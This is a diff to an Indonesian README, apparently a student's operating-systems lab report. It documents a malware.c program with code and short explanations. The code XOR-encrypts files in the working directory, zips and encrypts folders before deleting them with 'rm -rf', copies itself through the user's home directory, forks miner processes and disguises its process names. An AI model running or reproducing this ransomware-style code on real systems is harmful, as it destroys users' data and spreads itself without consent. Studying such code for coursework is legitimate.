@@ -406,6 +406,158 @@ a&b. mendowload, unzip sebuah file acak dan menghapus file zip asli setelah mela
 c.memindahkan file yang ada pada directory starter kit ke directory karantina, dan begitu juga sebaliknya.
 d. menghapus seluruh file yang ada di dalam directory karantina.
 
+### Soal 3
+
+  ## Script malware.c
+
+a.) Fungsi XOR File
+```
+void xor_file(const char *filename, int key) {
+    FILE *f = fopen(filename, "rb+");
+    if (!f) return;
+
+    int c;
+    long pos = 0;
+    while ((c = fgetc(f)) != EOF) {
+        fseek(f, pos, SEEK_SET);
+        fputc(c ^ key, f);
+        pos++;
+    }
+    fclose(f);
+}
+```
+  - Fungsi ini bertugas untuk mengenkripsi atau mendekripsi file menggunakan metode XOR.
+    - filename: Nama file yang akan diproses.
+    - key: Kunci enkripsi (integer).
+
+  - Membuka file dalam mode baca/tulis biner.
+  - Membaca setiap karakter (fgetc) dan mengenkripsinya dengan operasi XOR (c ^ key).
+  - Menulis kembali karakter hasil XOR ke file (fputc).
+
+b.) Fungsi Zip dan Enkripsi Folder
+```
+void zip_and_encrypt(const char *folderpath, int key) {
+    char zipname[512];
+    snprintf(zipname, sizeof(zipname), "%s.zip", folderpath);
+    char cmd[1024];
+    snprintf(cmd, sizeof(cmd), "zip -r -q '%s' '%s'", zipname, folderpath);
+    system(cmd);
+    xor_file(zipname, key);
+    char delcmd[512];
+    snprintf(delcmd, sizeof(delcmd), "rm -rf '%s'", folderpath);
+    system(delcmd);
+}
+```
+  - Membuat nama arsip zip berdasarkan nama folder.
+  - Mengeksekusi perintah zip dengan system.
+  - Mengenkripsi file zip menggunakan fungsi xor_file.
+  - Menghapus folder asli menggunakan perintah rm.
+
+c.) Fungsi Enkripsi File
+```
+void encrypt_file(const char *filepath, int key) {
+    xor_file(filepath, key);
+}
+```
+  - Fungsi ini hanya memanggil fungsi xor_file untuk mengenkripsi file tertentu.
+
+d.) Fungsi WannaCryptor
+```
+void run_wannacryptor() {
+    DIR *d = opendir(".");
+    if (!d) return;
+
+    time_t t = time(NULL);
+    int key = (int)t;
+    struct dirent *entry;
+    while ((entry = readdir(d)) != NULL) {
+        if (!strcmp(entry->d_name, "runme") || !strcmp(entry->d_name, "malware")) continue;
+        if (entry->d_type == DT_REG) {
+            encrypt_file(entry->d_name, key);
+        } else if (entry->d_type == DT_DIR) {
+            if (strcmp(entry->d_name, ".") && strcmp(entry->d_name, "..")) {
+                zip_and_encrypt(entry->d_name, key);
+            }
+        }
+    }
+    closedir(d);
+}
+```
+  - Membuka direktori saat ini dengan opendir.
+  - Membaca setiap entri di dalam direktori.
+  - Mengenkripsi file reguler menggunakan encrypt_file.
+  - Membuat arsip .zip untuk folder, lalu mengenkripsinya menggunakan zip_and_encrypt.
+
+e.) Fungsi Trojan
+```
+void run_trojan() {
+    char *home = getenv("HOME");
+    if (home)
+        scan_and_copy(home);
+}
+```
+  - Mendapatkan path ke direktori HOME.
+  - Memindai semua subdirektori dan menyalin file malware ke dalamnya.
+
+f.) Fungsi Rodok (Miner)
+```
+void run_rodok() {
+    for (int i = 0; i < MAX_MINERS; ++i) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            miner_process(i);
+            exit(0);
+        }
+    }
+    while (wait(NULL) > 0);
+}
+```
+  - Membuat sejumlah proses anak (maksimal MAX_MINERS).
+  - Setiap proses anak menjalankan fungsi miner_process.
+
+g.) Fungsi Utama
+```
+int main() {
+    prctl(PR_SET_NAME, "/init", 0, 0, 0);
+
+    pid_t pid = fork();
+    if (pid == 0) {
+        prctl(PR_SET_NAME, "wannacryptor");
+        while (1) {
+            run_wannacryptor();
+            sleep(30);
+        }
+    }
+
+    pid = fork();
+    if (pid == 0) {
+        prctl(PR_SET_NAME, "trojan.wrm");
+        while (1) {
+            run_trojan();
+            sleep(30);
+        }
+    }
+
+    pid = fork();
+    if (pid == 0) {
+        prctl(PR_SET_NAME, "rodok.exe");
+        run_rodok();
+        exit(0);
+    }
+
+    while (1) sleep(1000);
+    return 0;
+}
+```
+  - Fungsi utama menjalankan tiga proses:
+    - wannacryptor: Mengenkripsi file di direktori.
+    - trojan.wrm: Menyalin malware ke direktori pengguna.
+    - rodok.exe: Menjalankan proses mining palsu.
+
+  - Langkah kerja:
+    - Setiap proses dijalankan menggunakan fork.
+    - Nama proses diatur menggunakan prctl.
+
  
 ### Soal 4**
 a. ./debugmon list <user> akan menampilkan daftar semua proses yang sedang berjalan pada user tersebut  beserta PID, command, CPU usage, dan memory usage.
